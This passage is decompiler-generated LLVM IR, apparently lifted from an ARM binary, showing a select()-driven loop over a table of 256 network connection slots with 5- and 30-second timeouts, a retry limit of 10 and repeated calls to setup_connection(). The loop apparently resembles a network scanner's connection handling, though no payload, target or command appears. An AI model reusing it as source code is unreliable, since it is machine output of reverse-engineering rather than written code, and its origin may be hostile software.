  %v9_e37c = icmp eq i32 %v5_e378, %v3_e374
  store i1 %v9_e37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e37c, label %dec_label_pc_e384, label %dec_label_pc_e27c

dec_label_pc_e384:                                ; preds = %dec_label_pc_e33c
  %v0_e384 = load i32, i32* @r5, align 4
  %v2_e384 = icmp ugt i32 %v0_e384, 254
  store i1 %v2_e384, i1* %cpsr_c.global-to-local, align 1
  %v7_e384 = icmp eq i32 %v0_e384, 255
  store i1 %v7_e384, i1* %cpsr_z.global-to-local, align 1
  %v8_e388 = icmp sgt i32 %v0_e384, 255
  br i1 %v8_e388, label %dec_label_pc_e418, label %dec_label_pc_e38c

dec_label_pc_e38c:                                ; preds = %dec_label_pc_e384
  %v2_e394 = load i32, i32* @global_var_23a60.130, align 4
  store i32 %v2_e394, i32* %r1.global-to-local, align 4
  %v3_e398 = mul i32 %v0_e384, 256
  store i32 %v3_e398, i32* %r2.global-to-local, align 4
  %v2_e39c = mul i32 %v0_e384, 288
  store i32 %v2_e39c, i32* %r3.global-to-local, align 4
  %v2_e3a0 = add i32 %v2_e394, %v2_e39c
  store i32 %v2_e3a0, i32* @r0, align 4
  %v1_e3a4 = add i32 %v2_e3a0, 12
  %v2_e3a4 = inttoptr i32 %v1_e3a4 to i32*
  %v3_e3a4 = load i32, i32* %v2_e3a4, align 4
  store i32 %v3_e3a4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3a8 = icmp eq i32 %v3_e3a4, 0
  store i1 %v2_e3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3a8, label %dec_label_pc_e3ec, label %dec_label_pc_e3c8.preheader

dec_label_pc_e3c8.preheader:                      ; preds = %dec_label_pc_e38c
  %v2_e3ac = add i32 %v0_e384, 1
  %v2_e3b4 = and i32 %v2_e3ac, 134217728
  %v3_e3b4 = icmp ne i32 %v2_e3b4, 0
  store i1 %v3_e3b4, i1* %cpsr_c.global-to-local, align 1
  %v3_e3b8 = mul i32 %v2_e3ac, 288
  %v3_e3bc = add i32 %v2_e394, %v3_e3b8
  store i32 %v3_e3bc, i32* %r3.global-to-local, align 4
  store i32 %v0_e384, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e3c8

dec_label_pc_e3c8:                                ; preds = %dec_label_pc_e3c8.preheader, %dec_label_pc_e3d4
  %v0_e3d4 = phi i32 [ %v3_e3bc, %dec_label_pc_e3c8.preheader ], [ %v1_e3e0, %dec_label_pc_e3d4 ]
  %v0_e3c8 = phi i32 [ %v0_e384, %dec_label_pc_e3c8.preheader ], [ %v1_e3c8, %dec_label_pc_e3d4 ]
  %v1_e3c8 = add i32 %v0_e3c8, 1
  store i32 %v1_e3c8, i32* %r2.global-to-local, align 4
  %v7_e3cc = icmp eq i32 %v1_e3c8, 256
  br i1 %v7_e3cc, label %dec_label_pc_e418.loopexit, label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3c8
  store i32 %v0_e3d4, i32* @r0, align 4
  %v1_e3d8 = add i32 %v0_e3d4, 12
  %v2_e3d8 = inttoptr i32 %v1_e3d8 to i32*
  %v3_e3d8 = load i32, i32* %v2_e3d8, align 4
  %v2_e3dc = icmp eq i32 %v3_e3d8, 0
  %v1_e3e0 = add i32 %v0_e3d4, 288
  store i32 %v1_e3e0, i32* %r3.global-to-local, align 4
  br i1 %v2_e3dc, label %dec_label_pc_e3e8, label %dec_label_pc_e3c8

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e3c8, i32* @r5, align 4
  br label %dec_label_pc_e3ec

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e38c, %dec_label_pc_e3e8
  %v1_e3f4 = phi i32 [ %v2_e3a0, %dec_label_pc_e38c ], [ %v0_e3d4, %dec_label_pc_e3e8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3ec = icmp eq i32 %v1_e3f4, 0
  store i1 %v2_e3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3ec, label %dec_label_pc_e418, label %dec_label_pc_e3f4

dec_label_pc_e3f4:                                ; preds = %dec_label_pc_e3ec
  %v2_e3f4 = add i32 %v1_e3f4, 16
  %v3_e3f4 = inttoptr i32 %v2_e3f4 to i32*
  store i32 %v3_e374, i32* %v3_e3f4, align 4
  %v0_e3f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e3f8 = trunc i32 %v0_e3f8 to i16
  %v2_e3f8 = load i32, i32* @r0, align 4
  %v3_e3f8 = add i32 %v2_e3f8, 20
  %v4_e3f8 = inttoptr i32 %v3_e3f8 to i16*
  store i16 %v1_e3f8, i16* %v4_e3f8, align 2
  %v0_e3fc = call i32 @setup_connection()
  store i32 %v0_e3fc, i32* %r0.global-to-local, align 4
  %v1_e280.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_e27c

dec_label_pc_e404:                                ; preds = %dec_label_pc_d2b4
  store i32 ptrtoint (i32* @global_var_23a64.132 to i32), i32* %ip.global-to-local, align 4
  %v2_e408 = load i32, i32* @global_var_23a64.132, align 4
  store i32 %v2_e408, i32* %r0.global-to-local, align 4
  %v1_e40c = call i32 @__GI___libc_close(i32 %v2_e408)
  store i32 %v1_e40c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e410

dec_label_pc_e410:                                ; preds = %dec_label_pc_d290, %dec_label_pc_e404
  %v0_e410 = load i32, i32* @r5, align 4
  store i32 %v0_e410, i32* %r0.global-to-local, align 4
  %v1_e414 = call i32 @__GI_exit(i32 %v0_e410)
  store i32 %v1_e414, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e418

dec_label_pc_e418.loopexit:                       ; preds = %dec_label_pc_e3c8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e3ec, %dec_label_pc_e384, %dec_label_pc_e2b0, %dec_label_pc_e27c, %dec_label_pc_e418.loopexit, %dec_label_pc_e410
  %stack_var_-1880.1 = phi i32 [ %tmp314, %dec_label_pc_e410 ], [ %stack_var_-1880.0, %dec_label_pc_e418.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_e27c ], [ %stack_var_-1880.0, %dec_label_pc_e2b0 ], [ %stack_var_-1880.0, %dec_label_pc_e384 ], [ %stack_var_-1880.0, %dec_label_pc_e3ec ]
  %stack_var_-1876.1 = phi i16 [ %tmp342, %dec_label_pc_e410 ], [ %stack_var_-1876.0, %dec_label_pc_e418.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_e27c ], [ %stack_var_-1876.0, %dec_label_pc_e2b0 ], [ %stack_var_-1876.0, %dec_label_pc_e384 ], [ %stack_var_-1876.0, %dec_label_pc_e3ec ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 1668, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e434484 = load i32, i32* @sp, align 4
  %v3_e434485 = add i32 %v2_e434484, 1668
  %v4_e434486 = inttoptr i32 %v3_e434485 to i32*
  store i32 0, i32* %v4_e434486, align 4
  br label %dec_label_pc_e424.dec_label_pc_e424_crit_edge

dec_label_pc_e424.dec_label_pc_e424_crit_edge:    ; preds = %dec_label_pc_e418, %dec_label_pc_e424.dec_label_pc_e424_crit_edge
  %v0_e424.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e424 = add i32 %v0_e424.pre, 1664
  store i32 %v1_e424, i32* %ip.global-to-local, align 4
  %v1_e428 = add i32 %v0_e424.pre, 4
  store i32 %v1_e428, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_e430 = icmp eq i32 %v1_e428, 128
  %v2_e434 = load i32, i32* @sp, align 4
  %v3_e434 = add i32 %v2_e434, %v1_e424
  %v4_e434 = inttoptr i32 %v3_e434 to i32*
  store i32 0, i32* %v4_e434, align 4
  br i1 %v7_e430, label %dec_label_pc_e43c, label %dec_label_pc_e424.dec_label_pc_e424_crit_edge

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e424.dec_label_pc_e424_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e43c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e43c, i32* %stack_var_-352, align 4
  %v1_e444478 = add i32 %v0_e43c, 1540
  store i32 %v1_e444478, i32* @lr, align 4
  %v1_e448479 = add i32 %v0_e43c, 8
  store i32 %v1_e448479, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_e450480 = icmp eq i32 %v1_e448479, 128
  %v2_e454481 = load i32, i32* @sp, align 4
  %v3_e454482 = add i32 %v2_e454481, %v1_e444478
  %v4_e454483 = inttoptr i32 %v3_e454482 to i32*
  store i32 0, i32* %v4_e454483, align 4
  br i1 %v7_e450480, label %dec_label_pc_e45c, label %dec_label_pc_e444.dec_label_pc_e444_crit_edge

dec_label_pc_e444.dec_label_pc_e444_crit_edge:    ; preds = %dec_label_pc_e43c, %dec_label_pc_e444.dec_label_pc_e444_crit_edge
  %v0_e444.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_e444 = add i32 %v0_e444.pre, 1536
  store i32 %v1_e444, i32* @lr, align 4
  %v1_e448 = add i32 %v0_e444.pre, 4
  store i32 %v1_e448, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_e450 = icmp eq i32 %v1_e448, 128
  %v2_e454 = load i32, i32* @sp, align 4
  %v3_e454 = add i32 %v2_e454, %v1_e444
  %v4_e454 = inttoptr i32 %v3_e454 to i32*
  store i32 0, i32* %v4_e454, align 4
  br i1 %v7_e450, label %dec_label_pc_e45c, label %dec_label_pc_e444.dec_label_pc_e444_crit_edge

dec_label_pc_e45c:                                ; preds = %dec_label_pc_e444.dec_label_pc_e444_crit_edge, %dec_label_pc_e43c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e45c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e45c, i32* @r6, align 4
  store i32 %v0_e45c, i32* @r5, align 4
  %v5_e464 = trunc i32 %v0_e45c to i16
  store i16 %v5_e464, i16* %stack_var_-52, align 2
  %v2_f278 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e4bc

dec_label_pc_e46c:                                ; preds = %dec_label_pc_e4ec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e4d8, i1* %cpsr_z.global-to-local, align 1
  %v1_f268 = add i32 %v2_e4d0, 4
  %v2_f268 = inttoptr i32 %v1_f268 to i32*
  %v3_f268 = load i32, i32* %v2_f268, align 4
  br i1 %v7_e4d8, label %dec_label_pc_f268, label %dec_label_pc_e474

dec_label_pc_e474:                                ; preds = %dec_label_pc_e46c
  store i32 %v3_f268, i32* %ip.global-to-local, align 4
  %v3_e47c = udiv i32 %v3_f268, 32
  store i32 %v2_f278, i32* %r0.global-to-local, align 4
  %v3_e484 = mul nuw nsw i32 %v3_e47c, 4
  %v2_e488 = add i32 %v3_e484, %v2_f278
  store i32 %v2_e488, i32* %r3.global-to-local, align 4
  %v1_e48c = add i32 %v2_e488, -184
  %v2_e48c = inttoptr i32 %v1_e48c to i32*
  %v3_e48c = load i32, i32* %v2_e48c, align 4
  %v1_e490 = urem i32 %v3_f268, 32
  store i32 %v1_e490, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_e498 = shl i32 1, %v1_e490
  %v8_e498 = or i32 %v3_e48c, %v7_e498
  store i32 %v8_e498, i32* %r2.global-to-local, align 4
  store i32 %v8_e498, i32* %v2_e48c, align 4
  %v0_e4a0 = load i32, i32* @r6, align 4
  %v1_e4a0 = load i32, i32* %ip.global-to-local, align 4
  %v3_e4a0 = icmp uge i32 %v0_e4a0, %v1_e4a0
  store i1 %v3_e4a0, i1* %cpsr_c.global-to-local, align 1
  %v9_e4a0 = icmp eq i32 %v0_e4a0, %v1_e4a0
  store i1 %v9_e4a0, i1* %cpsr_z.global-to-local, align 1
  %v5_e4a4 = icmp slt i32 %v0_e4a0, %v1_e4a0
  br i1 %v5_e4a4, label %bb375, label %bb376

bb375:                                            ; preds = %dec_label_pc_e474
  store i32 %v1_e4a0, i32* @r6, align 4
  br label %bb376

bb376:                                            ; preds = %.thread56, %bb382, %bb380, %bb426, %dec_label_pc_e550, %dec_label_pc_e474, %bb375
  %v3_e4a8 = load i16, i16* %stack_var_-52, align 2
  %v4_e4a8 = sext i16 %v3_e4a8 to i32
  store i32 %v4_e4a8, i32* %r3.global-to-local, align 4
  %v1_e4ac = add nsw i32 %v4_e4a8, 1
  store i32 %v1_e4ac, i32* %r2.global-to-local, align 4
  %v2_e4b0 = icmp ugt i32 %v1_e4ac, 254
  store i1 %v2_e4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e4b0 = icmp eq i32 %v1_e4ac, 255
  store i1 %v7_e4b0, i1* %cpsr_z.global-to-local, align 1
  %v5_e4b4 = trunc i32 %v1_e4ac to i16
  store i16 %v5_e4b4, i16* %stack_var_-52, align 2
  %v8_e4b8 = icmp sgt i16 %v3_e4a8, 254
  br i1 %v8_e4b8, label %dec_label_pc_e55c, label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %bb376, %dec_label_pc_e45c
  %v0_e4c8 = phi i32 [ %v1_e4ac, %bb376 ], [ %v0_e45c, %dec_label_pc_e45c ]
  store i32 ptrtoint (i32* @global_var_23a60.130 to i32), i32* %r0.global-to-local, align 4
  %v3_e4c0 = mul i32 %v0_e4c8, 256
  store i32 %v3_e4c0, i32* %r3.global-to-local, align 4
  %v2_e4c4 = load i32, i32* @global_var_23a60.130, align 4
  store i32 %v2_e4c4, i32* @r1, align 4
  %v2_e4cc = mul i32 %v0_e4c8, 288
  store i32 %v2_e4cc, i32* %r2.global-to-local, align 4
  %v2_e4d0 = add i32 %v2_e4c4, %v2_e4cc
  store i32 %v2_e4d0, i32* @r4, align 4
  %v1_e4d4 = add i32 %v2_e4d0, 12
  %v2_e4d4 = inttoptr i32 %v1_e4d4 to i32*
  %v3_e4d4 = load i32, i32* %v2_e4d4, align 4
  store i32 %v3_e4d4, i32* %ip.global-to-local, align 4
  %v2_e4d8 = icmp ne i32 %v3_e4d4, 0
  store i1 %v2_e4d8, i1* %cpsr_c.global-to-local, align 1
  %v7_e4d8 = icmp eq i32 %v3_e4d4, 1
  store i1 %v7_e4d8, i1* %cpsr_z.global-to-local, align 1
  %v2_e4dc = xor i1 %v2_e4d8, true
  %v3_e4dc = or i1 %v7_e4d8, %v2_e4dc
  br i1 %v3_e4dc, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_e4bc
  store i32 5, i32* @r1, align 4
  br label %bb378

bb378:                                            ; preds = %dec_label_pc_e4bc, %bb377
  %v1_e4fc173 = phi i32 [ %v2_e4c4, %dec_label_pc_e4bc ], [ 5, %bb377 ]
  %v2_e4e0 = xor i1 %v7_e4d8, true
  %v3_e4e0 = and i1 %v2_e4d8, %v2_e4e0
  br i1 %v3_e4e0, label %bb379, label %bb380

bb379:                                            ; preds = %bb378
  store i32 30, i32* @r1, align 4
  br label %bb380

bb380:                                            ; preds = %bb378, %bb379
  %v1_e4fc = phi i32 [ %v1_e4fc173, %bb378 ], [ 30, %bb379 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e4e4 = icmp eq i32 %v3_e4d4, 0
  store i1 %v2_e4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4e4, label %bb376, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %bb380
  store i32 ptrtoint (i32* @global_var_20f84.119 to i32), i32* %r2.global-to-local, align 4
  %v2_e4f0 = load i32, i32* @global_var_20f84.119, align 4
  store i32 %v2_e4f0, i32* %r3.global-to-local, align 4
  %v1_e4f4 = add i32 %v2_e4d0, 8
  %v2_e4f4 = inttoptr i32 %v1_e4f4 to i32*
  %v3_e4f4 = load i32, i32* %v2_e4f4, align 4
  store i32 %v3_e4f4, i32* %r2.global-to-local, align 4
  %v2_e4f8 = sub i32 %v2_e4f0, %v3_e4f4
  store i32 %v2_e4f8, i32* %r3.global-to-local, align 4
  %v3_e4fc = icmp uge i32 %v2_e4f8, %v1_e4fc
  store i1 %v3_e4fc, i1* %cpsr_c.global-to-local, align 1
  %v9_e4fc = icmp eq i32 %v2_e4f8, %v1_e4fc
  store i1 %v9_e4fc, i1* %cpsr_z.global-to-local, align 1
  %v2_e500 = xor i1 %v3_e4fc, true
  %v3_e500 = or i1 %v9_e4fc, %v2_e500
  br i1 %v3_e500, label %dec_label_pc_e46c, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4ec
  %v1_e504 = add i32 %v2_e4d0, 4
  %v2_e504 = inttoptr i32 %v1_e504 to i32*
  %v3_e504 = load i32, i32* %v2_e504, align 4
  store i32 %v3_e504, i32* %r0.global-to-local, align 4
  %v1_e508 = call i32 @__GI___libc_close(i32 %v3_e504)
  store i32 %v1_e508, i32* %r0.global-to-local, align 4
  %v0_e50c = load i32, i32* @r4, align 4
  %v1_e50c = add i32 %v0_e50c, 12
  %v2_e50c = inttoptr i32 %v1_e50c to i32*
  %v3_e50c = load i32, i32* %v2_e50c, align 4
  store i32 %v3_e50c, i32* %r3.global-to-local, align 4
  %v2_e510 = icmp ugt i32 %v3_e50c, 1
  store i1 %v2_e510, i1* %cpsr_c.global-to-local, align 1
  %v7_e510 = icmp eq i32 %v3_e50c, 2
  store i1 %v7_e510, i1* %cpsr_z.global-to-local, align 1
  %v2_e514 = xor i1 %v2_e510, true
  %v3_e514 = or i1 %v7_e510, %v2_e514
  br i1 %v3_e514, label %bb381, label %.thread279

.thread279:                                       ; preds = %dec_label_pc_e504
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e51c276280 = add i32 %v0_e50c, 4
  %v3_e51c277281 = inttoptr i32 %v2_e51c276280 to i32*
  store i32 -1, i32* %v3_e51c277281, align 4
  br label %bb382

bb381:                                            ; preds = %dec_label_pc_e504
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e51c273 = add i32 %v0_e50c, 4
  %v3_e51c274 = inttoptr i32 %v2_e51c273 to i32*
  store i32 -1, i32* %v3_e51c274, align 4
  %v4_e520 = load i32, i32* %r3.global-to-local, align 4
  %v5_e520 = load i32, i32* @r4, align 4
  %v6_e520 = add i32 %v5_e520, 12
  %v7_e520 = inttoptr i32 %v6_e520 to i32*
  store i32 %v4_e520, i32* %v7_e520, align 4
  %v4_e524 = load i32, i32* %r3.global-to-local, align 4
  %v5_e524 = trunc i32 %v4_e524 to i8
  %v6_e524 = load i32, i32* @r4, align 4
  %v7_e524 = add i32 %v6_e524, 284
  %v8_e524 = inttoptr i32 %v7_e524 to i8*
  store i8 %v5_e524, i8* %v8_e524, align 1
  %v0_e528.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_e528.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb382

bb382:                                            ; preds = %.thread279, %bb381
  %v1_e528 = phi i1 [ %v1_e528.pre, %bb381 ], [ %v2_e510, %.thread279 ]
  %v0_e528 = phi i1 [ %v0_e528.pre, %bb381 ], [ false, %.thread279 ]
  %v2_e528 = xor i1 %v1_e528, true
  %v3_e528 = or i1 %v0_e528, %v2_e528
  br i1 %v3_e528, label %bb376, label %dec_label_pc_e52c

dec_label_pc_e52c:                                ; preds = %bb382
  %v0_e52c = load i32, i32* @r4, align 4
  %v1_e52c = add i32 %v0_e52c, 284
  %v2_e52c = inttoptr i32 %v1_e52c to i8*
  %v3_e52c = load i8, i8* %v2_e52c, align 1
  %v4_e52c = zext i8 %v3_e52c to i32
  %v1_e530 = add nuw nsw i32 %v4_e52c, 1
  %v1_e534 = urem i32 %v1_e530, 256
  store i32 %v1_e534, i32* %r3.global-to-local, align 4
  %v2_e538 = icmp ugt i32 %v1_e534, 9
  store i1 %v2_e538, i1* %cpsr_c.global-to-local, align 1
  %v7_e538 = icmp eq i32 %v1_e534, 10
  store i1 %v7_e538, i1* %cpsr_z.global-to-local, align 1
  %v1_e53c = trunc i32 %v1_e530 to i8
  store i8 %v1_e53c, i8* %v2_e52c, align 1
  %v0_e540 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e540, label %.thread56, label %dec_label_pc_e550

.thread56:                                        ; preds = %dec_label_pc_e52c
  %v1_e540 = load i32, i32* %r3.global-to-local, align 4
  %v2_e540 = add i32 %v1_e540, -10
  store i32 %v2_e540, i32* %r3.global-to-local, align 4
  %v2_e544 = load i32, i32* @r4, align 4
  %v3_e544 = add i32 %v2_e544, 12
  %v4_e544 = inttoptr i32 %v3_e544 to i32*
  store i32 %v2_e540, i32* %v4_e544, align 4
  %v1_e548 = load i32, i32* %r3.global-to-local, align 4
  %v2_e548 = trunc i32 %v1_e548 to i8
  %v3_e548 = load i32, i32* @r4, align 4
  %v4_e548 = add i32 %v3_e548, 284
  %v5_e548 = inttoptr i32 %v4_e548 to i8*
  store i8 %v2_e548, i8* %v5_e548, align 1
  %v0_e54c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e54c.pr.pr, label %bb376, label %dec_label_pc_e550

dec_label_pc_e550:                                ; preds = %dec_label_pc_e52c, %.thread56
  %v0_e550 = load i32, i32* @r4, align 4
  store i32 %v0_e550, i32* @r0, align 4
  %v0_e554 = call i32 @setup_connection()
  store i32 %v0_e554, i32* %r0.global-to-local, align 4
  br label %bb376

dec_label_pc_e55c:                                ; preds = %bb376
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_e568 = load i32, i32* @r5, align 4
  %v1_e568 = load i32, i32* @r6, align 4
  %v3_e568 = icmp uge i32 %v0_e568, %v1_e568
  store i1 %v3_e568, i1* %cpsr_c.global-to-local, align 1
  %v9_e568 = icmp eq i32 %v0_e568, %v1_e568
  store i1 %v9_e568, i1* %cpsr_z.global-to-local, align 1
  %v5_e56c = icmp slt i32 %v0_e568, %v1_e568
  %storemerge134 = select i1 %v5_e56c, i32 %v1_e568, i32 %v0_e568
  %v2_e578 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e578, i32* %ip.global-to-local, align 4
  %v2_e57c = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_e57c, i32* %r1.global-to-local, align 4
  %v2_e580 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_e580, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e588 = add i32 %storemerge134, 1
  store i32 %v1_e588, i32* %r0.global-to-local, align 4
  %v5_e594 = call i32 @__libc_select(i32 %v1_e588, i32 %v2_e57c, i32 %v2_e580, i32 0, i32 %v2_e578)
  %v0_e598 = load i32, i32* @r4, align 4
  store i32 %v0_e598, i32* %r0.global-to-local, align 4
  %v1_e59c = inttoptr i32 %v0_e598 to i32*
  %v2_e59c = call i32 @__GI_time(i32* %v1_e59c)
  store i32 %v2_e59c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f84.119 to i32), i32* @lr, align 4
  %v0_e5a4 = load i32, i32* @r4, align 4
  %v5_e5a4 = trunc i32 %v0_e5a4 to i16
  store i16 %v5_e5a4, i16* %stack_var_-52, align 2
  store i32 %v2_e59c, i32* @global_var_20f84.119, align 4
  %v2_eec0 = ptrtoint i32* %stack_var_-45 to i32
  %v2_eed4 = ptrtoint i32* %stack_var_-80 to i32
  %v2_eedc = ptrtoint i32* %stack_var_-77 to i32
  %v2_ec90 = ptrtoint i32* %stack_var_-60 to i32
  %v2_eca4 = ptrtoint i8* %stack_var_-56 to i32
  %v2_ecac = bitcast i8* %stack_var_-56 to i32*
  %v2_efcc = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e5ac

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e720, %dec_label_pc_e55c
  %v0_e5b8 = phi i32 [ %v1_e724, %dec_label_pc_e720 ], [ %v0_e5a4, %dec_label_pc_e55c ]
  store i32 ptrtoint (i32* @global_var_23a60.130 to i32), i32* %r0.global-to-local, align 4
  %v3_e5b0 = mul i32 %v0_e5b8, 256
  store i32 %v3_e5b0, i32* %r3.global-to-local, align 4
  %v2_e5b4 = load i32, i32* @global_var_23a60.130, align 4
  store i32 %v2_e5b4, i32* %r1.global-to-local, align 4
  %v2_e5bc = mul i32 %v0_e5b8, 288
  store i32 %v2_e5bc, i32* %r2.global-to-local, align 4
  %v2_e5c0 = add i32 %v2_e5b4, %v2_e5bc
  store i32 %v2_e5c0, i32* @r5, align 4
  %v1_e5c4 = add i32 %v2_e5c0, 4
  %v2_e5c4 = inttoptr i32 %v1_e5c4 to i32*
  %v3_e5c4 = load i32, i32* %v2_e5c4, align 4
  store i32 %v3_e5c4, i32* %r0.global-to-local, align 4
  %v2_e5c8 = icmp eq i32 %v3_e5c4, -1
  store i1 %v2_e5c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e5c8 = icmp eq i32 %v3_e5c4, -1
  store i1 %v7_e5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5c8, label %dec_label_pc_e720, label %dec_label_pc_e5d0

dec_label_pc_e5d0:                                ; preds = %dec_label_pc_e5ac
  %v3_e5d0 = udiv i32 %v3_e5c4, 32
  store i32 %v2_f278, i32* %r1.global-to-local, align 4
  %v3_e5dc = mul nuw nsw i32 %v3_e5d0, 4
  store i32 %v3_e5dc, i32* @ip, align 4
  %v2_e5e0 = add i32 %v3_e5dc, %v2_f278
  store i32 %v2_e5e0, i32* %r2.global-to-local, align 4
  %v1_e5e4 = add i32 %v2_e5e0, -312
  %v2_e5e4 = inttoptr i32 %v1_e5e4 to i32*
  %v3_e5e4 = load i32, i32* %v2_e5e4, align 4
  %v1_e5e8 = urem i32 %v3_e5c4, 32
  store i32 %v1_e5e8, i32* %r1.global-to-local, align 4
  %v2_e5ec = add nsw i32 %v1_e5e8, -1
  %v3_e5ec = shl i32 1, %v2_e5ec
  %v4_e5ec = and i32 %v3_e5e4, %v3_e5ec
  %v5_e5ec = icmp ne i32 %v4_e5ec, 0
  store i1 %v5_e5ec, i1* %cpsr_c.global-to-local, align 1
  %v6_e5ec = ashr i32 %v3_e5e4, %v1_e5e8
  store i32 %v6_e5ec, i32* %r3.global-to-local, align 4
  %v1_e5f0 = urem i32 %v6_e5ec, 2
  %v2_e5f0 = icmp eq i32 %v1_e5f0, 0
  store i1 %v2_e5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5f0, label %dec_label_pc_e5f8, label %dec_label_pc_f0b0

dec_label_pc_e5f8:                                ; preds = %dec_label_pc_e5d0, %dec_label_pc_f160
  %v1_e608 = phi i32 [ %v1_e5e8, %dec_label_pc_e5d0 ], [ %v1_e608.pre, %dec_label_pc_f160 ]
  %v0_e600 = phi i32 [ %v3_e5dc, %dec_label_pc_e5d0 ], [ %v0_e600.pre, %dec_label_pc_f160 ]
  store i32 %v2_f278, i32* %r3.global-to-local, align 4
  %v2_e600 = add i32 %v0_e600, %v2_f278
  store i32 %v2_e600, i32* %r2.global-to-local, align 4
  %v1_e604 = add i32 %v2_e600, -184
  %v2_e604 = inttoptr i32 %v1_e604 to i32*
  %v3_e604 = load i32, i32* %v2_e604, align 4
  %v2_e608 = add i32 %v1_e608, -1
  %v3_e608 = shl i32 1, %v2_e608
  %v4_e608 = and i32 %v3_e604, %v3_e608
  %v5_e608 = icmp ne i32 %v4_e608, 0
  store i1 %v5_e608, i1* %cpsr_c.global-to-local, align 1
  %v6_e608 = ashr i32 %v3_e604, %v1_e608
  store i32 %v6_e608, i32* %r3.global-to-local, align 4
  %v1_e60c = urem i32 %v6_e608, 2
  %v2_e60c = icmp eq i32 %v1_e60c, 0
  store i1 %v2_e60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e60c, label %dec_label_pc_e720, label %dec_label_pc_e614.preheader

dec_label_pc_e614.preheader:                      ; preds = %dec_label_pc_e5f8
  %v0_e614156 = load i32, i32* @r5, align 4
  %v1_e614157 = add i32 %v0_e614156, 12
  %v2_e614158 = inttoptr i32 %v1_e614157 to i32*
  %v3_e614159 = load i32, i32* %v2_e614158, align 4
  store i32 %v3_e614159, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e618155161 = icmp eq i32 %v3_e614159, 0
  store i1 %v2_e618155161, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e618155161, label %dec_label_pc_e720, label %dec_label_pc_e620.lr.ph

dec_label_pc_e614.loopexit:                       ; preds = %dec_label_pc_ef70, %dec_label_pc_ede0
  %v0_e614 = load i32, i32* @r5, align 4
  %v1_e614 = add i32 %v0_e614, 12
  %v2_e614 = inttoptr i32 %v1_e614 to i32*
  %v3_e614 = load i32, i32* %v2_e614, align 4
  store i32 %v3_e614, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e618155 = icmp eq i32 %v3_e614, 0
  store i1 %v2_e618155, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e618155, label %dec_label_pc_e720, label %dec_label_pc_e620.lr.ph

